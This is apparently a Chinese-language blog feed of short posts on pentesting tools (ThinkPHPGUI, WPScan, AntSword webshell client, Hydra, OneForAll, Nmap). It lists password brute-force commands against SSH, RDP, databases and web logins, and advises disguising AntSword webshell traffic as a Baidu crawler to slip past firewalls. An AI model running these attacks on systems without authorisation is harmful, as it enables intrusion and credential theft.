vulnerability in com_joomlaquiz</span><br><span class="line">[+] Arbitrary File Upload vulnerability in com_joomlaquiz</span><br><span class="line">[+] Arbitrary File Upload vulnerability in com_joomlaquiz</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> Joomscan </tag>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THinkphp</title>
      <link href="/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ThinkPHPGUI/"/>
      <url>/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/ThinkPHPGUI/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ThinkPHPGUI"><a href="#ThinkPHPGUI" class="headerlink" title="ThinkPHPGUI"></a>ThinkPHPGUI</h1><p>Thinkphp（GUI）漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。</p><p>​<code>D:\A网安\工具\漏扫&gt;java -jar ThinkphpGUI-1.3-SNAPSHOT.jar</code>​</p><p>图示：</p><p><img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-09-15110110-20240420172221-1dtmurj.png" alt="ThinkPHPGUI"></p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> THinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wpscan</title>
      <link href="/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wpscan/"/>
      <url>/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Wpscan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Wpscan"><a href="#Wpscan" class="headerlink" title="Wpscan"></a>Wpscan</h1><p>该扫描器可以实现获取<code>Wordpress</code>​站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。</p><p>同时还可以实现对未加防护的<code>Wordpress</code>​站点暴力破解用户名密码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">--update    |     更新到最新版本</span><br><span class="line">--url       | -u  <span class="tag">&lt;<span class="name">target</span> <span class="attr">url</span>&gt;</span>  要扫描的`WordPress`站点.</span><br><span class="line">--force     | -f  不检查网站运行的是不是`WordPress`</span><br><span class="line">--enumerate | -e  [option(s)]  枚举</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------</span><br><span class="line">0x02 工具利用</span><br><span class="line">1、扫描WordPress漏洞</span><br><span class="line">wpscan --url http://www.xxxxx.top/</span><br><span class="line"></span><br><span class="line">2、扫描wordpress用户</span><br><span class="line">wpscan --url http://www.xxxxx.top/ --enumerate u</span><br><span class="line"></span><br><span class="line">3、扫描主题</span><br><span class="line">wpscan --url http://www.xxxxx.top/ --enumerate t</span><br><span class="line">扫描主题中的漏洞</span><br><span class="line">wpscan --url http://www.xxxxx.top/ --enumerate vt</span><br><span class="line"></span><br><span class="line">4、扫描插件漏洞</span><br><span class="line">wpscan --url http://www.xxxxx.top/ --enumerate p</span><br><span class="line">扫描插件中的漏洞</span><br><span class="line">wpscan --url http://www.xxxxx.top/ --enumerate vp</span><br><span class="line"></span><br><span class="line">5、使用WPScan进行暴力破解</span><br><span class="line">wpscan --url https://www.xxxxx.top/ -e u --wordlist /root/桌面/password.txt</span><br><span class="line">wpscan --url http://xxxx.com/wordpress -P [密码字典] -U [用户名字典]</span><br><span class="line">---------------------------------------------------------------------------------------------</span><br><span class="line">u 枚举用户名，默认从1-10</span><br><span class="line"></span><br><span class="line">u[10-20] 枚举用户名，配置从10-20</span><br><span class="line"></span><br><span class="line">p 枚举插件</span><br><span class="line"></span><br><span class="line">vp 只枚举有漏洞的插件</span><br><span class="line"></span><br><span class="line">ap 枚举所有插件，时间较长</span><br><span class="line"></span><br><span class="line">tt 列举缩略图相关的文件</span><br><span class="line"></span><br><span class="line">t 枚举主题信息</span><br><span class="line"></span><br><span class="line">vt 只枚举存在漏洞的主题</span><br><span class="line"></span><br><span class="line">at 枚举所有主题，时间较长</span><br><span class="line"></span><br><span class="line">可以指定多个扫描选项，例：&quot;-e tt,p&quot;</span><br><span class="line"></span><br><span class="line">如果没有指定选项，默认选项为：&quot;vt,tt,u,vp&quot;</span><br><span class="line"></span><br><span class="line">--exclude-content-based &quot;<span class="tag">&lt;<span class="name">regexp</span> <span class="attr">or</span> <span class="attr">string</span>&gt;</span>&quot;</span><br><span class="line"></span><br><span class="line">当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹</span><br><span class="line"></span><br><span class="line">--config-file | -c <span class="tag">&lt;<span class="name">config</span> <span class="attr">file使用指定的配置文件</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--user-agent</span> | <span class="attr">-a</span> &lt;<span class="attr">User-Agent指定User-Agent</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--cookie</span> &lt;<span class="attr">String指定cookie</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--random-agent</span> | <span class="attr">-r</span> <span class="attr">使用随机User-Agent</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--follow-redirection</span> <span class="attr">如果目标包含一个重定向</span>，<span class="attr">则直接跟随跳转</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--batch</span> <span class="attr">无需用户交互</span>，<span class="attr">都使用默认行为</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--no-color</span> <span class="attr">不要采用彩色输出</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--wp-content-dir</span> &lt;<span class="attr">wp</span> <span class="attr">content</span> <span class="attr">dirWPScan会去发现wp-content目录</span>，<span class="attr">用户可手动指定</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--wp-plugins-dir</span> &lt;<span class="attr">wp</span> <span class="attr">plugins</span> <span class="attr">dir指定wp插件目录</span>，<span class="attr">默认是wp-content</span>/<span class="attr">plugins</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--proxy</span> &lt;[<span class="attr">protocol:</span>//]<span class="attr">host:port设置一个代理</span>，<span class="attr">可以使用HTTP</span>、<span class="attr">SOCKS4</span>、<span class="attr">SOCKS4A</span>、<span class="attr">SOCKS5</span>，<span class="attr">如果未设置默认是HTTP协议</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--proxy-auth</span> &lt;<span class="attr">username:password设置代理登陆信息</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--basic-auth</span> &lt;<span class="attr">username:password设置基础认证信息</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--wordlist</span> | <span class="attr">-w</span> &lt;<span class="attr">wordlist指定密码字典</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--username</span> | <span class="attr">-U</span> &lt;<span class="attr">username指定爆破的用户名</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--usernames</span> &lt;<span class="attr">path-to-file指定爆破用户名字典</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--threads</span> | <span class="attr">-t</span> &lt;<span class="attr">number</span> <span class="attr">of</span> <span class="attr">threads指定多线程</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--cache-ttl</span> &lt;<span class="attr">cache-ttl设置</span> <span class="attr">cache</span> <span class="attr">TTL</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--request-timeout</span> &lt;<span class="attr">request-timeout请求超时时间</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--connect-timeout</span> &lt;<span class="attr">connect-timeout连接超时时间</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--max-threads</span> &lt;<span class="attr">max-threads最大线程数</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--throttle</span> &lt;<span class="attr">milliseconds当线程数设置为1时</span>，<span class="attr">设置两个请求之间的间隔</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--help</span> | <span class="attr">-h</span> <span class="attr">输出帮助信息</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--verbose</span> | <span class="attr">-v</span> <span class="attr">输出Verbose</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">--version</span> <span class="attr">输出当前版本</span></span></span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> Wpscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国蚁剑</title>
      <link href="/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
      <url>/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><p>中国蚁剑是 一 款比菜刀还牛的shell控制端软件</p><p>‍</p><p>​<img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE110445-20240420172052-4s8e9vr.png" alt="蚁剑图示">​</p><p>‍</p><h2 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h2><p>User-Agent：修改头部信息</p><p>POST：提交数据</p><p>​<img src="/assets/2021051722174283-20230915112041-cengdng.png" alt="2021051722174283">​</p><p>​<img src="/assets/1639911794_61bf1172505ba588380b2-20230915113346-pxg0zfu.jpg" alt="1639911794_61bf1172505ba588380b2">​</p><h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><p>User-Agent 设置好后，但我们却发现注入的代码基本是明文传输，如果目标有防火墙之类的设备，我们会很难连接上shell<br>antsword 提供了几种编码器也可以尝试使用，</p><p>如 chr 编码器，PHP 类型独有，通信时使用chr函数对传输的字符串进行处理拼接，可以看到请求中除了 eval 字样没有明显的特征信息</p><p>​<img src="/assets/20210517221650430-20230915112053-pyzd8yk.png" alt="20210517221650430">​</p><h2 id="编码设置"><a href="#编码设置" class="headerlink" title="编码设置"></a>编码设置</h2><p>‍</p><p>​<img src="/assets/20210517221719449-20230915112053-6ro8xh9.png" alt="20210517221719449">​</p><h2 id="插件市场"><a href="#插件市场" class="headerlink" title="插件市场"></a>插件市场</h2><p>​<img src="/assets/20210517221855990-20230915112053-igdolxv.png" alt="20210517221855990">​</p><p>‍</p><h2 id="User-Agent修改"><a href="#User-Agent修改" class="headerlink" title="User-Agent修改"></a>U<strong>ser-Agent修改</strong></h2><p>软件默认的user-agent是：User-Agent: antSword&#x2F;v2.0；</p><p>而且大部分人都不会去自定义useragent，这就给waf和蜜罐白白送了一个特征，</p><p>所以我们要修改一下源代码：</p><p>修改项目路径：</p><p>antSword\modules\request.js （修改const USER_AGENT &#x3D; ‘antSword&#x2F;v2.1’; 这一行代码！）</p><p>antSword\modules\update.js （有两处要修改；可搜索“antSword&#x2F;v2.0”来找到这两行代码！）</p><p>‍</p><p>我这里是把</p><p><strong>antSword&#x2F;v2.0</strong></p><p>或<strong>antSword&#x2F;v2.1</strong></p><p>修改为了<strong>Baiduspider-image</strong>，我改成了百度图片蜘蛛；</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 中国蚁剑 </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Hydra/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Hydra/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h1><p>Hydra也叫九头蛇，是一款开源的暴力PJ工具，集成在kali当中。</p><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">-l   指定用户名</span><br><span class="line">-p   指定密码</span><br><span class="line">-L   指定用户名字典</span><br><span class="line">-P   指定密码字典</span><br><span class="line">-C   指定所用格式为“user:password”的字典文件</span><br><span class="line">-e</span><br><span class="line">    n null，表示尝试空密码</span><br><span class="line">    s same，把用户名本身当做密码进行尝试</span><br><span class="line">    r 反向，把用户名倒叙，当做密码进行尝试。</span><br><span class="line">-vV  显示执行细节</span><br><span class="line">-o   保存执行结果</span><br><span class="line">-s   指定非默认端口</span><br><span class="line">-M   指定破解的目标文件，如果不是默认端口，后面跟上“:port”</span><br><span class="line">-t   指定爆破时的任务数量（默认16）线程数</span><br><span class="line">-f   破解出密码就停止爆破</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">爆破ssh协议</span><br><span class="line">hydra -l root -p 12345678 192.168.31.173 ssh -vV</span><br><span class="line"></span><br><span class="line">使用字典爆破</span><br><span class="line">hydra -l root -P 密码字典 192.168.31.173 ssh</span><br><span class="line"></span><br><span class="line">SSH协议的默认用户是 root，所以上面我们都是指定的用户名，如果不确定用户名，就要指定用户名字典，比如下面这种格式：</span><br><span class="line">hydra -L usr.txt -P pwd.txt 192.168.31.173 ssh</span><br><span class="line"></span><br><span class="line">get方式提交，破解web登录：</span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/</span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</span><br><span class="line"></span><br><span class="line">post方式提交，破解web登录：</span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username\=USER&amp;password\=PASS&amp;submit\=login:sorry password&quot;</span><br><span class="line">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id\=USER&amp;passwd\=PASS:\&lt;title\&gt;wrong username or password\&lt;/title\&gt;&quot;</span><br><span class="line"></span><br><span class="line">破解https：</span><br><span class="line">hydra -m /index.php -l muts -P pass.txt IP https</span><br><span class="line">hydra -m /index.php -l username -P pass.txt IP https</span><br><span class="line">----------------------------------</span><br><span class="line">Hydra爆破常见服务</span><br><span class="line">远程桌面（RDP）</span><br><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 rdp</span><br><span class="line"></span><br><span class="line">共享文件（SMB）</span><br><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 smb</span><br><span class="line"></span><br><span class="line">文件传输（FTP）</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 ftp</span><br><span class="line"></span><br><span class="line">邮箱协议（POP3）</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 pop3</span><br><span class="line"></span><br><span class="line">MSSQL数据库</span><br><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mssql</span><br><span class="line"></span><br><span class="line">MySQL数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 mysql</span><br><span class="line"></span><br><span class="line">Oracle数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 oracle</span><br><span class="line"></span><br><span class="line">Redis数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 redis</span><br><span class="line"></span><br><span class="line">PgSQL数据库</span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 postgresql</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> Hydra </tag>
            
            <tag> 密码爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OneForALL</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/OneForALL/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/OneForALL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="OneForALL"><a href="#OneForALL" class="headerlink" title="OneForALL"></a>OneForALL</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>一款功能强大的子域名收集工具</p><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>1.收集能力强大。<br>①利用证书透明度收集子域（目前有6个模块：censys_api、certspotter、crtsh、entrust、google、spyse_api）<br>②常规检查收集子域（目前有4个模块：域传送漏洞利用axfr、检查跨域策略文件cdx、检查HTTPS证书cert、检查内容安全策略csp、检查robots文件robots、检查sitemap文件sitemap、利用NSEC记录遍历DNS域dnssec、NSEC3记录等模块）<br>③利用网上爬虫档案收集子域（目前有2个模块：archivecrawl、commoncrawl）<br>④利用DNS数据集收集子域（目前有23个模块：binaryedge_api、 bufferover,、cebaidu、 chinaz、 chinaz_api、 circl_api、dnsdb_api,、dnsdumpster, hackertarget、 ip138、ipv4info_api、netcraft、passivedns_api、 ptrarchive、qianxun、rapiddns、riddler, robtex、 securitytrails_api、 sitedossier、 threatcrowd、wzpc、ximcx）<br>⑤利用DNS查询收集子域（目前有5个模块：通过枚举常见的SRV记录并做查询来收集子域srv、以及通过查询域名的DNS记录中的MX、NS、SOA、TXT记录来收集子域）<br>⑥利用威胁情报平台数据收集子域（目前有6个模块：alienvault、riskiq_api、threatbook_api、threatminer、virustotal、virustotal_api）<br>⑦利用搜索引擎发现子域（目前有18个模块：ask、 baidu、 bing、 bing_api、 duckduckgo、 exalead、 fofa_api、 gitee、github、 github_api、 google、 google_api、 shodan_api、 so、 sogou、 yahoo、 yandex、 zoomeye_api），在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索、全量搜索、递归搜索。<br>2.支持子域爆破，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。<br>3.支持子域验证，默认开启子域验证，自动解析子域DNS，自动请求子域获取title和banner，并综合判断子域存活情况。<br>4.支持子域接管，默认开启子域接管风险检查，支持子域自动接管（目前只有Github，有待完善），支持批量检查。<br>5.处理功能强大，发现的子域结果支持自动去除，自动DNS解析，HTTP请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有rst、 csv,、 tsv、 json、 yaml、 html、 xls、 xlsx、 dbf、 latex、 ods。<br>6.速度极快，收集某块使用多线程调用，爆破模块使用massdns，默认配置下速度最少能达到10000pps，子域验证中DNS解析和HTTP请求使用异步多协程，多线程检查子域接管风险。<br>7.体验良好，各模块都有进度条，异步保存各模块结果。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>SYNOPSIS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oneforall.py --target=TARGET <span class="tag">&lt;<span class="name">flags</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DESCRIPTION<br>    Version: 0.0.4<br>    Project: <a href="https://git.io/fjHT1">https://git.io/fjHT1</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target Example Domain run</span><br><span class="line">python3 oneforall.py --target ./domains.txt run</span><br><span class="line">python3 oneforall.py --target example.com --brute True run</span><br><span class="line">python3 oneforall.py --target Example Domain --verify False run</span><br><span class="line">python3 oneforall.py --target Example Domain --valid None run</span><br><span class="line">python3 oneforall.py --target example.com --port medium run</span><br><span class="line">python3 oneforall.py --target example.com --format csv run</span><br><span class="line">python3 oneforall.py --target example.com --show True run</span><br></pre></td></tr></table></figure><pre><code>Note:      参数valid可选值1，0，None分别表示导出有效，无效，全部子域      参数verify为True会尝试解析和请求子域并根据结果给子域有效性打上标签      参数port可选值有&#39;small&#39;, &#39;medium&#39;, &#39;large&#39;, &#39;xlarge&#39;，详见config.py配置      参数format可选格式有&#39;txt&#39;, &#39;rst&#39;, &#39;csv&#39;, &#39;tsv&#39;, &#39;json&#39;, &#39;yaml&#39;, &#39;html&#39;,                          &#39;jira&#39;, &#39;xls&#39;, &#39;xlsx&#39;, &#39;dbf&#39;, &#39;latex&#39;, &#39;ods&#39;      参数path为None会根据format参数和域名名称在项目结果目录生成相应文件</code></pre><p>ARGUMENTS<br>    TARGET<br>        单个域名或者每行一个域名的文件路径(必需参数)</p><p>FLAGS<br>    –brute&#x3D;BRUTE<br>        使用爆破模块(默认False)<br>    –verify&#x3D;VERIFY<br>        验证子域有效性(默认True)<br>    –port&#x3D;PORT<br>        请求验证的端口范围(默认medium)<br>    –valid&#x3D;VALID<br>        导出子域的有效性(默认1)<br>    –path&#x3D;PATH<br>        导出路径(默认None)<br>    –format&#x3D;FORMAT<br>        导出格式(默认xlsx)<br>    –show&#x3D;SHOW<br>        终端显示导出数据(默认False)</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> OneForALL </tag>
            
            <tag> 子域名收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Nmap/"/>
      <url>/2024/04/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Nmap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-v :  显示IP的冗余信息,详细的扫描过程</span><br><span class="line">-sV:  探测端口及版本服务信息</span><br><span class="line">-O ： 显示出操作系统的类型。 每一种操作系统都有一个指纹</span><br><span class="line">-A :  全面扫描，all ports；</span><br><span class="line"></span><br><span class="line">-p<span class="tag">&lt;<span class="name">name</span>&gt;</span> 指定扫描的协议，例如-p http 即可扫描http协议的端口状态</span><br><span class="line">--exclude-ports  排除指定端口不扫描</span><br><span class="line">-F    极速模式，仅扫描100个常用端</span><br><span class="line"></span><br><span class="line">-sS   TCP SYN 扫描，不进行ping 